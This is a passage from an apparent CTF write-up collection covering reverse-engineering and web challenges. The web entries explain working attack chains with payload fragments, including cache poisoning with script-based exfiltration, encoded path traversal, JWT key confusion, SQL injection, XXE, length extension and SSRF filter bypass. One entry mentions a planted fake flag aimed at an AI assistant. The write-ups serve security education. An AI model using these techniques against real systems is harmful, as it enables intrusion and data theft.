6. Which MAC is the trap: the U-Boot environment region holds two copies, both with valid CRC32s and different `ethaddr` values. U-Boot's redundant-environment scheme runs the copy with the higher flags byte, and only the flags-7 copy decodes to ASCII.

**Why it works**

Every layer names the key to the next: the DICTID names the dictionary, the init script names the XOR. The only decision is the documented redundant-environment rule.

**Validation**

Decoded with both MAC candidates; only one produces printable text, confirming the flags rule empirically.
### PoshTerm
Reverse engineering · Easy · Swyam Kumar
Points at solve: 120

**Tools used:** `bsdtar`; static analysis only — the executable was never run.

**Approach**

1. A 227 MB PE32+ whose section layout versus file size says most of it is overlay: a small native host wrapping a bundled Node/JS payload.
2. Carved the JavaScript by walking outwards from the cmdlet table until the printable run ended.
3. Every cmdlet registers through one helper; the hidden one is attached separately with a `hidden` flag, so the command listing never shows it. Two MD5 gates guard it — one on an environment variable, one on its last argument — then it searches Wikipedia, extracts a date, converts it through a Julian-date API pinned to seven decimals, and RC4-decrypts a 48-byte blob using the date string as key.
4. Neither gate needs cracking: the seven-decimal format fixes the key shape, and a midnight date always yields the same fractional part, so the key space is a few hundred thousand strings. Exactly one decrypts the blob to clean ASCII, and the plaintext is exactly 48 bytes with no padding.
5. Cross-checked the date against the same converter in reverse.

**Why it works**

The gated arguments only select a date, and the date space is small. Recovering the derived key offline is cheaper than passing the checks that produce it, and it does not depend on a live source that has since changed.

**Validation**

`solve.py` carves the blob from the executable and runs from `dist/` alone; the exact-length plaintext confirms the key. Ten planted fake flags, one addressed to an AI assistant, were logged and discarded.
### proprietary
Reverse engineering · Hard · Sam
Points at solve: 711

**Tools used:** Ghidra (headless), `gdb`, `radare2`.

**Approach**

1. The checker server's source runs the same stripped Rust validator and accepts on its verdict, so the challenge is solvable offline.
2. Container format: a 16-byte header with magic, version, flags, application count, reserved, declared length and checksum.
3. Integrity is not a CRC: `h = rotl32(h,5) ^ byte; h *= 0x9E3779B1; h ^= h >> 15`, over the whole image with checksum fields zeroed. Confirmed against the shipped empty card.
4. Two mandatory applications with exact per-file policies, plus a 16-byte credential payload whose window must cover a given year, whose clearance bit 0 must be set and whose trailing bytes must be zero.
5. Stages 3–5 withhold their reason, but the reasons are built in memory before being discarded. A breakpoint where every formatted message converges printed the real defect on each run.
6. The scripted session, XOR-obfuscated in `.rodata`, decodes to 35 six-byte commands; its arithmetic pins the starting balance.
7. The second key is chained from the first, not derived from the operator ID — the obvious reading stops at command 12 of 35.

**Why it works**

The format is a specification the binary enforces exactly, and every secret is derivable from values the card carries. The difficulty is recovering it from a binary built to refuse explanations.

**Validation**

`solve.py` builds the card from scratch and the local validator returns `accepted, 5/5` before submission.
### Split Horizon
Reverse engineering · Medium · Dan-Andrei Grigorescu
Points at solve: 270

**Tools used:** `ilspycmd` for the .NET assembly; `scapy` for the capture.

**Approach**

1. The artifacts are generated per team: a capture, a .NET control library, the command server's Go source, a signed audit log and a manifest.
2. The bug is a parser differential. The drone uses .NET `System.Text.Json` with exact case-sensitive matching and ignores unmatched spellings; the server uses Go `encoding/json`, which matches case-insensitively and keeps the last duplicate.
3. One command carries the waypoint twice — lower case, then upper case with different values. The drone flies the first pair; the server keeps the last and validates a position inside tolerance. Drift is about 341 m.
4. Three other commands carry upper-case duplicates with identical values — camouflage, so duplicate keys look like protocol noise.
5. Recovering the commands required unmasking frames with `HMAC-SHA256(MaskA ^ MaskB, clientNonce || serverNonce)[:16]`, both masks static in the library. Commands must stay raw bytes; a JSON parser would collapse the duplicates.
6. The audit log stores `SHA-256(salt || "lat|lon")` with a never-written salt, but equal coordinates give equal commitments, so the log's partition is an oracle for what the server parsed.

**Why it works**

Neither parser is buggy; each behaves as documented. The defect is that two components with different documented behaviour are both treated as authoritative for the same bytes.

**Validation**

The Go model predicts the partition `[[1],[2,10],[3,4],[5,6],[7,8,9,11,12]]` and the log produces exactly that — a twelve-element match by chance is negligible. The hash chain and Ed25519 root signature verify.
### The Lock Box
Reverse engineering · Easy · Terminal43
Points at solve: 120

**Approach**

1. Followed the `open` handler in the stripped ELF. Its visible 33-byte check XORs the input with `0x5b` and prints a message about last week's code — a decoy.
2. The branch that prints `GATE: pass phrase accepted` instead checks a value written by an earlier startup routine, which handles `open` with a 44-byte phrase.
3. Read the `LOCKBOX1` record in `.rodata`: it stores the length, an initial state byte of `0x5b`, eight key bytes and 44 comparison bytes.
4. For byte `i`, the startup routine XORs the input byte with the current state, rotates left by `1 + 3*i` bits, and adds the corresponding key byte. The next state is the current state plus `i` and the encoded byte, modulo 256.
5. Used the comparison bytes to walk the state forward while inverting the three operations on each input byte.
6. Ran the recovered phrase through the forward transform and matched all 44 bytes.

**Why it works**

The transform is invertible byte by byte because the state depends only on previous bytes, and the comparison table supplies the target for each position. Walking forward with a known state removes the need to guess anything.

**Validation**

Re-encrypting the recovered phrase reproduces all 44 comparison bytes exactly, which is a complete check on the inversion.

### Uplink Denied
Reverse engineering · Easy · Chronos Security
Points at solve: 120

**Approach**

1. Checked the hash of `cau_verify` and disassembled the validation routine at `0x4014f0`.
2. It checks a 24-byte reset key as three little-endian 64-bit words. Each word goes through three `x ^ (x >> 33)` steps with two odd multiplications in between.
3. Results are compared against constants stored at file offsets `0x159d`, `0x15bf` and `0x1608`.
4. Reversed the steps in reverse order. The XOR shift is its own inverse for a 64-bit word because shifting right by 33 twice discards every bit.
5. Inverted each multiplication modulo 2⁶⁴, packed the recovered words back into ASCII, and ran the forward transform on all three to confirm they matched the verifier constants.

**Why it works**

The transform is a composition of bijections on 64 bits — XOR-shift and multiplication by an odd constant — so it can be undone exactly. Recognising the fmix-style finaliser is what turns a search into arithmetic.

**Validation**

All three recovered words re-encode to their stored constants, and the packed key is printable ASCII of the expected length.

## Web

### Apogee
Web · Hard · Mohamed Amine Mzoughi
Points at solve: 540

**Approach**

1. The pipeline journal identifies the hostile package: one entry reports six entries validated against seven in the archive, lists the same table name twice, and shows it as a symlink pointing out of staging into the write-protected store.
2. ZIP permits two central-directory entries with the same name. The manifest verifier resolves a name to one entry — the last — and hashes only that. The extractor processes every entry in order and honours Unix mode bits.
3. Ordering the symlink entry before a regular file of the same name makes the extractor write through the symlink, outside the sandbox. No path contains `..`, so path safety never fires and every manifest hash is honest.
4. The first submission declared the symlink member and was rejected for a size mismatch — proof the verifier keeps the last entry. Re-declaring the file entry was accepted and extraction wrote through the symlink.
5. The analyst route needs no vendor accreditation, so the same technique restores the validated table.
6. The receipt was locked; the unlock value is a SHA-256 over fields the status endpoint publishes.

**Why it works**

Two components disagree about what "the entry named X" means — the verifier says the last one, the extractor says all of them in order. Everything the verifier checks is true; it is simply not checking the entry that lands on disk.

**Validation**

After the restore, the trusted table's SHA-256 equals the validated original's at the same byte length — the condition the challenge defines as success.
### Broadsheet Organizer
Web · Hard · Paul Valase
Points at solve: 851

**Tools used:** a raw-socket HTTP client (`h.py`) so the exact request line — including dot-segments and their encoding — is under our control; `curl -I` for cache headers; the challenge's own headless duty editor as the execution target. The `X-Cache`/`Age` pair is the oracle for every cache claim.

**Approach**

1. Map the floor. Eight zones; `/z/<zone>/board` is what the duty editor opens, and it always loads `/z/<zone>/ticker.js` — the only dynamic response that caches (`X-Cache: HIT`, ~12 s TTL). Every other dynamic route is `no-store`.
2. Note the two interesting sinks and why neither works alone: `/z/<zone>/embed/<token>?html=` reflects its parameter verbatim as `text/html`, but sits in a sandboxed iframe with `no-store`; `/z/<zone>/ticker.js?text=` JSON-escapes into `textContent`, so it carries text, not code.
3. Confirm the prize is behind the bot. `/editor` returns a byte-identical 403 to every external client — a measured 1,400+ cookie/desk/header combinations plus 2,107 probed paths for a session-issuance route found nothing, and it is neither cached nor state-dependent. The desk session is never sent to a client; it can only be read from inside the editor's own browser.
4. Find the disagreement between the layers. Varnish computes its cache **key** from the normalised path but forwards the **raw** path upstream. Flask matches the raw path, and the embed view validates the token only as the *first* path segment — trailing segments are ignored. So `/z/<zone>/embed/<token>/../../ticker.js?html=<js>` is routed to the embed view (which renders our raw JavaScript) while Varnish files the response under `/z/<zone>/ticker.js`.
5. Check which VCL rule applies at that key. The ticker rule forces `Content-Type: application/javascript`, sets the ~12 s TTL and — crucially — overrides the embed view's `no-store`. The same trick at an `/app.js` or `/style.css` key does **not** work: the generic static rule honours `no-store`, three MISSes, real asset intact. The ticker is the only override.
6. Set up the visit: publish one notice in a fresh zone (a review of an empty zone is rejected), `GET /z/<zone>` to mint the 12-hex embed nonce from the page, then `POST /review zone=<zone>`.
7. Re-poison every ~12.6 s until the duty-log row appears. The bot's page load lands 10–32 s after the POST, so a single 12 s entry usually expires first — a refresh loop, not a one-shot.
8. The bot opens the board; its `<script src="/z/<zone>/ticker.js">` is a cache HIT of our JavaScript and executes in the editor's origin. That origin is the loopback address, so a same-origin `GET /editor` is answered as the editorial terminal, with the rotation key — and `document.cookie` is empty, because the privilege is the local origin, not a session cookie.
9. Exfiltrate over the same cache: the script base64s the `/editor` response and writes ~330–460 character chunks into `/z/<slot>/ticker.js?text=` slots (any `[a-z0-9-]` name works; the zone need not exist), then we read the slots back within their TTL, concatenate and decode. The editor page was 1,179 bytes — six chunks, and the key was in chunk 5.

**Why it works**

Three layers disagree about what the same URL is. Varnish keys on the normalised path, Flask routes on the raw path, and the VCL decides content type and cacheability from the key. That disagreement converts a reflected-HTML gadget that is useless inside a sandboxed iframe into a *cached JavaScript object at the bot's own ticker URL* — and only the ticker rule is willing to override `no-store`. The privilege escalation is not a cookie forgery: it is that the same code now runs on the origin the application trusts implicitly.

**Validation**

Every cache step was proven with paired requests rather than assumed: `MISS` on the poisoning request, `HIT` on the plain ticker fetch, the body byte-compared, `Age` progressing 0→11, and the TTL measured by watching an entry expire at t+13.1 s. The negative results were measured to the same standard and are what kept the card from being closed on the wrong theory: `no-store` was honoured at `/app.js` and `/style.css` keys (three MISSes, real asset unchanged), a 15-payload escaping battery across every rendering context produced zero unescaped bytes, `?text=` was JSON-escaped at the byte level, `/review` ignored every extra navigation field, and the only SQL-injectable parameter reached tables with no flag in them. The submission was accepted on the first post, and the platform then refused to re-issue the instance ("Challenge already solved"), so the live chain could not be re-run afterwards — which is why the solver and the escape/decoding logic were committed with the card.

### Corridor Transit Gate
Web · Medium · Chronos Security
Points at solve: 299

**Approach**

1. The transport directorate API holds a convoy at a weighbridge: the scale read 46,200 kg against a declared 22,000, over the 40,000 viaduct limit. The standard clearance route is refused with an axle-weight discrepancy and says it requires the internal dispatch controller.
2. Everything under `/api/v1/internal/*` returns 403 from the front proxy. The ACL is bound to the raw path prefix — `X-Forwarded-For` spoofing and dot/slash normalisation all still resolve to 403.
3. The public route `/api/v1/telemetry/station/{id}` takes an id segment. The gateway checks its ACL against the raw, still-URL-encoded path and does not decode `%2f`, but the Go backend decodes it and resolves the traversal.
4. So `/api/v1/telemetry/station/..%2f..%2finternal%2f<route>` reaches the internal router past the ACL. The backend's JSON 404 echoes the decoded path, which is a useful oracle — confirmed by traversing to a known route.
5. Generic route names 404'd. The docket page loads `chunk-dispatch-admin.9c4d.js`, which defines `internalDispatch: "/api/v1/internal/dispatch/emergency-clearance"` with body `{consignment_id, reason}`.
6. Posted that route through the traversal with the convoy id and an emergency-corridor reason.

**Why it works**

The proxy authorises one string and the backend routes another. Encoding the separators means the ACL never sees a path that matches its prefix, while the backend's decoder produces one that does.

**Validation**

The oracle confirmed traversal before the real request, and the response returned `status: APPROVED` with the gate barrier open and the clearance token.

### Cutover
Web · Hard · Mohamed Amine Mzoughi
Points at solve: 540

**Approach**

1. The bypass was found by reading the four shipped source files before touching the instance.
2. The vendored graph-reference parser addresses nodes by decimal index as a string and resolves them with `input[value]` where `input` is an Array. A reference named `__proto__` is not an index — it reads `Array.prototype`, and the parser stores that live reference.
3. Intake does `const basis = manifest.basis ?? {}` then a one-level `target[key] = source[key]` merge. Point `basis` at `Array.prototype` and the merge writes onto the prototype.
4. The tier module stores grants in an Array used as a dictionary and tests `grants[action] === true`, so lookup falls through the prototype chain. One poisoned manifest upgrades the session's tier.
5. The live instance added a risk gateway with a numeric grammar and a "defer downstream when undetermined" policy.
6. The hostile batch was identified from the data: the buffer endpoint's position/projection difference equals one batch's settled aggregate, that batch is the only one whose settled aggregate disagrees with its declared value, and it is far above its originator's historical maximum.
7. The gateway blocks the plain decimal form of the capped value, but exponent forms pass while the downstream parser yields the same integer.

**Why it works**

Three choices compose: a reference parser that hands you a prototype, a one-level merge that writes wherever pointed, and a permission check that reads through the prototype chain. None is exploitable alone.

**Validation**

The real intake and tier modules were run in node and the permission check watched to flip; a local replica showed a recall go from "tier insufficient" to reconciled after one poisoned manifest. Live traffic was about a dozen requests.
### Cyberboy
Web · Hard · Chronos Security
Points at solve: 540

**Approach**

1. No handout — the API documents itself. Three smells are visible in the prose: the session caches effective unit scope from the account's home unit while a profile endpoint exposes a duty-assignment field that feeds that scope at the next refresh; rotations are addressed by an opaque ref encoding unit and sequence; and the export endpoint takes its tier from the request body.
2. Reference forgery was a dead end, usefully. The reference decodes as `rr_<base64url(UNIT:SEQ)>.<16 hex MAC>`, and the read endpoint does not verify the MAC — sixteen zeros reads fine, including other units' rotations. The write endpoints do verify it, so a forged reference cannot be exported.
3. Scope escalation: the profile endpoint accepts a duty assignment naming another unit on an ordinary analyst account, and the refresh endpoint re-issues the session with that scope. The rotations listing then returns the other unit's rotations with their valid signed references.
4. Tier confusion: exporting an already-approved rotation with the tier taken from the body produces a sealed bundle at that tier. The tier is never checked against the rotation's own authorized tier, so raising it to master seals a theatre-master bundle, and its authorization code is the flag.

**Why it works**

Three authorization decisions each trust a different attacker-influenced input: the read path trusts an unverified reference, the session scope trusts a user-writable profile field, and the export tier trusts the request body.

**Validation**

Each step was confirmed by its own observable effect — a cross-unit read, a re-issued session scope, and a custody field that changed from unit to theatre — rather than by assuming the next step followed.

### Helioform Relay
Web · Hard · Ahmed Abdelmoemen
Points at solve: 682

**Approach**

1. `/mesh` accepts the agent subprotocol `hsp.raw.1` on the strength of the `Sec-WebSocket-Protocol` token alone; the docs' claim that the edge authenticates an agent is false. No credential, ticket, mTLS or cookie is consulted.
2. The raw stream implements `DIAL`, splicing TCP to `127.0.0.1` and only that literal. The loopback inventory is catalogd, provd, recordd, the peer port and the app.
3. A catalogd `HELLO` returns a nonce; sending it back as the whole body returns a ticket. Redeeming it at provd for the relay environment file returns the factory console and replication MAC keys.
4. The session docs give the cookie format: base64url JSON `{iss, aud, role, exp}` plus HMAC-SHA256 of the payload. With the leaked console key an `admin` cookie forges a console session.
5. The replication port accepts a peer `hello` and `blob` signed with the second key; `stream_id` is used as a filesystem path, which makes it an arbitrary write.
6. Wrote a Python runbook into the advertised runbook directory. The scheduler strips the header line, runs the rest, and renders stdout on the automation page.

**Why it works**

Each layer authenticates the previous one with a static factory secret, and the secrets are readable through the unauthenticated agent channel. The last hop is a documented feature reached by writing where only a peer should write.

**Validation**

Raw framing won whenever the exact token appeared, all other DIAL spellings were refused, and the runbook output appeared on the console poll. A shell runbook fails because the scheduler is Python.
### Inside the Cordon
Web · Medium · Chronos Security
Points at solve: 270

**Approach**

1. `GET /` issues a station cookie; every station endpoint answers `401 SESSION_REQUIRED` without it.
2. The PIN gate is client-side. `POST /api/station/pin-check` with a wrong PIN answers `success:false` but still issues an `attempt` token. The page's own JavaScript says the browser's local branch decides whether to activate.
3. The failed attempt is a valid input to `POST /api/station/activate`, which never asks whether the PIN was correct. It returns the capability, the cordon centre and radius, and the restricted room name.
4. Opened the WebSocket channel and sent `station.authenticate` with the capability; the reply carries freshness, eligibility TTL, frame limit and window.
5. The station is scripted to report a position 412.8 m from the cordon centre, outside the 75 m radius, which leaves the eligible room null. Reporting the centre handed back by activate yields `inside:true, distance_m:0.0` and the eligible room.
6. Sent `room.join` for that room and received the restricted briefing with the clearance token.

**Why it works**

The server treats "the browser checked the PIN" as authentication and issues a signed attempt on failure. The capability proves the attempt exists, not that it succeeded, so the whole PIN is a red herring.

**Validation**

Controls pinned the protocol: no cookie gives 401; an outside-cordon position gives `inside:false` with 412.8 m and `NOT_ELIGIBLE`; a stale observation gives `STALE_POSITION`; unknown frame types give `BAD_MESSAGE`.

### Interdiction Hold
Web · Easy · Chronos Security
Points at solve: 120

**Approach**

1. The clearance API lists consignments; one is held. Each consignment has a manifest of line items and a customs approval record.
2. The approval exposes its `covered_fields`, and `/schema` confirms the catch: the approval is bound to a hash computed over `covered_fields` only, and `hs_code` is not in that set.
3. A separate `PATCH /consignments/<id>/lineitems/<k>` can change a line item's `hs_code` after approval is granted, so amending it does not invalidate the approval.
4. The held consignment's line item declared an embargoed tariff code. The first PATCH used an invented code and was rejected — the server validates against a tariff table.
5. Switched to a recognised, non-controlled code already present on another line of the same manifest; the amendment was accepted with the approval still valid.
6. `POST /consignments/<id>/release` then released the consignment and returned the clearance token.

**Why it works**

The approval's integrity hash covers a field set chosen by the issuer, not the fields that determine admissibility. Any field outside that set can be changed after approval without breaking the seal — a scope bug rather than a crypto bug.

**Validation**

The approval remained valid after the amendment, the release succeeded, and the response carries the certificate with the clearance token. The rejected invented code also confirms that server-side tariff validation is real rather than cosmetic.

### Interlock
Web · Hard · Mohamed Amine Mzoughi
Points at solve: 593

**Approach**

1. The schema maps everything: an observer desk for a two-bus substation, dual control with distinct principals, delegate uniqueness by casefold, an operations API, `fast-uri` 3.1.2 validation and the unlock formula.
2. Edge bypass: the proxy authorises the path as received. Literal `/ops/...` is refused, but `/api/v1/../../ops/...` starts with an allowed prefix and normalises into `/ops` at the backend. `%2e%2e` works; `%2f` slashes do not, so `curl --path-as-is` is required.
3. Dual control with NFKC lookalikes: the roster matches with NFKC plus casefold, but uniqueness and the distinct-principals test only casefold, so NFKC-equivalent but byte-distinct names pass the roster and count as two principals.
4. The approval upstream was down on fresh instances, but pooled nodes already carried signed orders. A signed order is distinguishable by pointing it at a broken URL — the parse error proves the fetcher was reached.
5. Unlock: `sha256("interlock|<order_id>|<buses joined by comma>")`.
6. Quarantine bypass: case, trailing dot, port and percent-encoded dots are all normalised, but `fast-uri` does not fold U+3002 while the fetcher's WHATWG parser maps it to `.`, so the parsed host misses the quarantine and still resolves.

**Why it works**

Four small mismatches — path authorisation, Unicode normalisation, verification order and URL parsing — compose into a signed isolation order delivered to the quarantined gateway.

**Validation**

The same release token came back on three independent signed orders. A wrong bus set returns a held receipt echoing the exact unlock input.
### Key Custody
Web · Easy · Chronos Security
Points at solve: 120

**Approach**

1. `GET /token` issues an analyst session: an HS256 JWT with `kid: session` and payload `{sub, role}`.
2. `GET /schema` states that the console loads each token's signing key by its `kid` header, and that the admin route requires the issued analyst subject with `role=admin`.
3. `GET /public/{name}` serves brand assets. A sweep of brand-style names found a 201-byte text asset — the command banner notice — and the key directory sits one level above `public/`.
4. Set `kid="../public/brand.txt"` and signed header plus payload with the asset's raw bytes as the HMAC-SHA256 key, keeping the issued `sub` and changing only `role` to `admin`.
5. The verifier also accepts the SHA-256 of the file as key, but the raw bytes are byte-exact, including the trailing newline.
6. Posted the forged token to the admin recovery route.

**Why it works**

`kid` is a user-controlled filename joined to a key directory with no sanitisation, and the algorithm is whatever the token header says. A public file therefore becomes an HMAC secret, and the only remaining binding — the issued subject — is preserved.

**Validation**

A control matrix pinned every condition: the issued token gives 403 without `role=admin`; the right `kid` with the wrong key gives 401; dropping the trailing newline gives 401; changing `sub` gives 403; the full forgery returns 200 with the recovery key.

### keyring
Web · Easy · Iulian Schifirnet
Points at solve: 120

**Approach**

1. Registered a normal liaison account. The session cookie was an RS256 JWT with `role: user`.
2. The `/developers` page published the RSA verification key at a well-known PEM path and documented the token's `sub`, `role`, `iat`, `exp` and `jti` claims.
3. Changed `role` to `admin` and changed the JWT header to `alg: HS256`.
4. HMAC-signed the new header and payload with the exact PEM bytes from the public endpoint — the trailing newline matters; stripping it made the signature fail.
5. The server accepted the forged cookie at the admin route, so it was using the RSA public key as an HMAC secret whenever a token selected HS256.
6. The admin page printed the break-glass recovery key.

**Why it works**

The classic algorithm-confusion flaw: the verifier picks the algorithm from the token rather than pinning it, and the same key material is usable as an HMAC secret. Anything published for verification becomes signing material.

**Validation**

The forged token was accepted only with the exact PEM bytes including the newline, and only with `role: admin`; the admin page then returned the recovery key.

### Landfall
Web · Hard · Mohamed Amine Mzoughi
Points at solve: 741

**Approach**

1. An emergency-alert console has a fabricated evacuation alert on air, but the account is only an observer and the dispatcher role has been withdrawn from everyone. Four stacked bugs are all required.
2. Ed25519 non-canonical malleability: dispatch needs a signed capability grant covering the authority, geocodes and severity. The ledger enforces single-use on `sig_sha256`, not on `jti`, and its verifier-disagreement note says the downstream verifier accepts a scalar `S` not reduced mod the group order. Since `[L]·B` is the identity, `(R, S)` and `(R, S + kL)` verify identically but hash to different signatures; `S+2L` gives a fresh `sig_sha256` that still verifies.
3. JSON key-case differential: of three submission paths, the v1 passthrough is the only one that does not reject duplicate members. The role gate resolves the operation case-insensitively, while the broadcast handler reads the exact-case `"operation"` key. Sending both keys makes the policy check see `preview` while the handler executes `dispatch`.
4. Grant scope: reuse the capability grant whose claims cover the on-air authority, area and severity — a cancel can carry lower severity, so any covering grant works.
5. Unlock digest: `sha256("landfall|<cap_id>|<jti>|<area>")`, carried with a CAP cancel whose `references` names the fabricated alert's sender, identifier and sent time.

**Why it works**

Signature malleability defeats single-use accounting, and a duplicate-key parser differential separates the authorisation decision from the executed action. Either bug alone is insufficient; together they let an observer broadcast a cancellation.

**Validation**

The staged order returned `status: BROADCAST` with a cancellation on air and the flag. The solver re-derives session, grants and the on-air message each run because they rotate per instance.

### Operation Dawn: The Access Log
Web · Easy · Terminal43
Points at solve: 120

**Approach**

1. Grouped the checkpoint portal requests by client and decoded the `unit` query parameter.
2. The injection tested one character at a time with `SUBSTR(token, position, 1)` and slept for two seconds on a match.
3. The briefing pointed to a client that never drew an error page. Among the clients injecting SQL, only one always got HTTP 200.
4. Used the delayed response for each of that client's 41 positions and checked there was exactly one hit per position.
5. Reading the characters in order produced the complete token, including its wrapper.

**Why it works**

A time-based blind injection needs a stable oracle, and status codes alone do not distinguish a successful probe from an error page. Selecting the client whose requests never error removes that ambiguity, and the fixed two-second delay makes each hit unambiguous in the log timestamps.

**Validation**

Exactly one delayed hit per position across all 41 positions, and the assembled characters form a complete token in the expected format.

### Operation Dawn: The Command Seal
Web · Medium · Terminal43
Points at solve: 270

**Approach**

1. `POST /report` logs the parsed `<summary>` element, so an XXE entity reads the relay's own outbox and returns a complete command-signed order with its digest and RSA signature.
2. Recovered the digest formula: `base64(sha256("id|kind|text"))` reproduces the journal digest exactly for the captured order, and the `sig` is an RSA-2048 blob over that digest.
3. `POST /order` takes a `<relay>` document holding one or more `<order>` elements plus one `<auth>`. The digest check is evaluated against the last order element, while the relay acts on the first.
4. With one unsigned order the digest fails; with the signed order alone it is acknowledged. Putting an unsigned `kind=standing` order first and the captured signed order last makes the relay act on the unsigned one while verifying the signed one.
5. Kinds are case-sensitive and unknown kinds merely echo the text; `kind=standing` is the one that makes the relay honour command's standing order.

**Why it works**

A verify/act split on the same document lets an attacker pair a valid seal with a different order. The signature is genuine and the digest matches — it simply belongs to the element the relay did not execute.

**Validation**

Four document shapes were tested and behaved as the split predicts, and the XXE was restricted to the journal path — other files and other paths under the relay directory failed to parse. Dead ends recorded: upper-case `STANDING` is acknowledged but releases nothing, and replacing `ref` fails the signature.

### Operation Dawn: The Dispatch Console
Web · Medium · Terminal43
Points at solve: 271

**Approach**

1. The console's SQL-keyword sanitiser inspects the raw request bytes while the form parser decodes afterwards. Sending `UNION SELECT x` literally is rejected, but the same text percent-encoded is accepted and stored as the decoded literal.
2. Stored callsigns are interpolated unparameterised into the digest endpoint's per-callsign query — a second-order injection.
3. Built a payload that balances the handler's own closing quote and avoids comments, which are unreliable on the wire, to union-select callsign, token and role from the operators table.
4. The digest output exposed three operator tokens, one of which carried the command role.
5. The command token unlocks the report renderer, where the `fmt` parameter is handed to `str.format(dispatch=...)`. Attribute access and indexing are live.
6. Probed with `{dispatch}` and `{dispatch.__class__}` to confirm the object was traversable, then read the process environment through the object's globals.

**Why it works**

The filter and the parser disagree about when decoding happens, so the sanitiser never sees the keywords it blocks. The renderer then evaluates a user-supplied format string against a live object, and `str.format` resolves attribute and item access.

**Validation**

The stored row read back as the literal `UNION SELECT`, the digest printed the operators table, and the rendered report returned the flag from the environment. Calls are not available — `os.popen(...)` parses as an attribute name and errors — which confirms the traversal is attribute/index only.

### Operation Dawn: The Standing Order
Web · Medium · Terminal43
Points at solve: 289

**Approach**

1. The field relay issued an operator cookie shaped like `hex(message).sha1_digest`, decoding to `user=guest&role=operator`. The relay page required `role=admin`.
2. Treated the digest as a secret-prefix SHA-1 MAC and performed a length-extension attack. A 16-byte guessed secret length worked on the first try.
3. Appended SHA-1 glue padding and `&role=admin` to the original message, then continued SHA-1 from the original digest to produce a valid MAC for the extended message.
4. The relay accepted the forged cookie and showed its command page.
5. The command page exposed a node probe and an internal provisioning URL on loopback. The probe explicitly refused `127.0.0.1`, but accepted the equivalent short-form loopback spelling `127.1`.
6. Sent the probe at the provisioning URL using that spelling and received the standing order.

**Why it works**

`sha1(secret || message)` is a secret-prefix MAC, and Merkle–Damgård hashing lets anyone continue the state from a known digest. The SSRF filter then compares literal strings rather than resolved addresses, so an equivalent spelling of the same host bypasses it.

**Validation**

The forged cookie was accepted where the original was refused, and the probe returned the standing order only for the short-form loopback spelling, confirming both the extension and the filter behaviour.

### smuggler
Web · Easy · Author not listed
Points at solve: 120

**Approach**

1. The Meridian portal serves report pages at `/d/<id>`. Public packets render normally; the one controlled packet is marked "Withheld" in the dashboard.
2. That gating exists only in the dashboard JavaScript. Requesting the controlled page directly returns the full page, including a `window.__EXPORT__` object with every data part.
3. The name is the hint: the export is smuggled past logs and caches by being assembled in the browser rather than downloaded from the server.
4. `/assets/exporter.js` shows the three build steps: concatenate `parts`, transcode from a custom base64 alphabet to the standard one and `atob`, then XOR the bytes with a keystream from `xorshift32(seed)`.
5. Reproduced those steps in Python and unzipped the resulting blob.
6. The archive contained a release-authorization text file with the single-use authorization code.

**Why it works**

The server never serves the export as a file, so no download log or cache entry exists to gate. The client assembles it from data already present in the page, and the only protection is a UI state that a direct request ignores.

**Validation**

The rebuilt ZIP opens cleanly, and the authorization file inside contains the code in the expected format. Three independent steps are reproduced from the page's own exporter rather than guessed.

### switchboard
Web · Easy · Author not listed
Points at solve: 120

**Approach**

1. The public board's `/static/switchboard.js` decoded an internal controller hostname.
2. Sent requests to the assigned instance with that value in the HTTP `Host` header. The same server then served the controller interface, which listed `/auth`, `/operators` and `/export/trunk-key`.
3. `POST /auth` accepted a JSON `username` and created a signed session cookie. Authenticating as `supervisor` still produced `role: operator`.
4. `/operators` showed that `EX-01` was the on-duty supervisor. Adding `"role":"supervisor"` to the authentication body was accepted without an independent check.
5. Reused the returned session cookie on the export route with the same Host header, and the controller returned the trunk key.

**Why it works**

The router serves different virtual hosts by the `Host` header, so a name leaked in client-side JavaScript becomes a route into an internal application. That application then accepts a client-supplied role claim alongside the username, so authentication and authorisation collapse into one unchecked field.

**Validation**

The controller interface only appeared with the internal Host header, and the elevated session returned the trunk key from a route that the operator role could not reach.

### Two-Key Turn
Web · Easy · Author not listed
Points at solve: 120

**Approach**

1. The console enforces a two-person rule with a check-then-insert: it verifies that the approving officer is distinct from the ones already on the order, then writes the approval record.
2. Fired eight concurrent `POST /orders/AO-7D31C9/approve` requests with the single VEGA-7 key.
3. All eight pass the distinctness check before any of them commits, because the check reads the current approval set and none of the concurrent writes has landed yet.
4. Two approvals land, both attributed to the same officer — the two-person rule is satisfied on paper by the same person twice.
5. The order transitions to `ARMED`, and its `arming_authorization` field is the flag.

**Why it works**

The check and the insert are not atomic, so concurrent requests all observe the pre-write state. This is a classic time-of-check to time-of-use race: the invariant "approver not already present" is true for every request when it is evaluated.

**Validation**

The race was repeated to confirm the outcome is stable rather than a single lucky interleaving, and the armed order's authorization field contains the flag. The single key was the only credential used, which is what makes the duplicate attribution meaningful.

### Vesper Quay Board
Web · Medium · Author not listed
Points at solve: 291

**Approach**

1. The desk and the quay parse the same warrant JSON with different rules: the desk is Go `encoding/json`, which matches keys case-insensitively; the quay is Python `json`, which is case-sensitive.
2. Sent one body carrying both spellings. The desk approves a benign `status` call while the quay reads the other spelling and runs the legacy courier's `-c <script>` argument.
3. That is unauthenticated code execution in the quay loader.
4. The child process environment contains the station signing key, so the correction can be signed by the quay itself.
5. Submitted the signed correction as the verification code.

**Why it works**

Two parsers disagree about which duplicate key wins, exactly as in the other cross-language differential challenges this weekend. The security check runs in one language and the dangerous action in the other, so the same bytes are safe to the reviewer and hostile to the executor.

**Validation**

The benign call was approved while the quay executed the alternate argument, and the returned correction carried a signature the station itself produced and accepted.

## Welcome

### Welcome Aboard
Welcome · Informational · Chronos Security
Points at solve: 100

**Tools used:** Python's `base64` module.

**Approach**

1. The briefing carries one transmission token that uses only the Base64 alphabet and ends in a padding `=`.
2. Decoded it directly rather than through a web tool: `base64.b64decode(token).decode("ascii")`.
3. The result is printable ASCII already in the event's flag format, so it was submitted unchanged.

**Why it works**

Base64 is a transport encoding, not a cipher. The alphabet and the padding carry no key, so recognition of the encoding *is* the whole solve.

**Validation**

The decoded bytes were printable ASCII with no replacement characters, matched the announced flag format, and the platform accepted the submission.

### Comms Check
Welcome · Informational · Chronos Security
Points at solve: 100

**Tools used:** the official event Discord.

**Approach**

1. The briefing says the net runs on Discord and asks for the recognition word "the watch is broadcasting".
2. Joined the official server and read the channel metadata rather than the message backlog — the wording points at static text, not at a conversation.
3. An organiser hint narrowed it to channel descriptions; the rules channel's topic carried the 2026 recognition word.
4. Submitted the word in the announced flag format.

**Why it works**

Channel topics are staff-editable and are not part of the message history, which makes them a natural place for a static token that every participant can read but nobody scrolls past.

**Validation**

